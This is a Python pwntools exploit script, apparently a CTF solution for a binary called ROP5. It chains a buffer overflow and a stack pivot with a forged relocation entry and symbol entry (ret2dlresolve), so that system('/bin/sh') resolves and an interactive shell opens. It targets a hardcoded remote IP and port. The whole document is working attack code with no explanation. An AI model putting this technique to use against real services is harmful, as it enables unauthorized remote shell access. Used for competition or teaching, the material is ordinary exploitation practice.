from pwn import*
p = process('./ROP5')
rop = ROP('./ROP5')
elf = ELF('./ROP5')
p = remote('47.103.214.163',20700)
plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

base_stage = 0x804A060 + 0x400

rop.raw('U' * 0x48)
rop.read(0, base_stage, 100)
rop.migrate(base_stage)

p.sendlineafter('LEVEL5?',rop.chain())

fake_sym_addr = base_stage + 24 #fake_sym
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf) #alignment
fake_sym_addr = fake_sym_addr + align # 
index_dynsym = (fake_sym_addr - dynsym) / 0x10
st_name = fake_sym_addr + 0x10 - dynstr #system
fake_read_sym = flat([st_name, 0, 0, 0x12])

index_offset = base_stage + 16 - rel_plt
read_got = elf.got['read']
r_info = (index_dynsym << 8) | 0x7 
fake_read_reloc = flat([read_got, r_info])

payload  = p32(plt0)
payload += p32(index_offset)
payload += 'UUUU'
payload += p32(base_stage + 80) # binsh
payload += fake_read_reloc
payload += 'U'*align
payload += fake_read_sym
payload += 'system\x00'
payload += 'U' * (80 -len(payload))
payload += '/bin/sh\x00'
payload += 'U'*(100 - len(payload))
p.sendline(payload)
p.interactive()
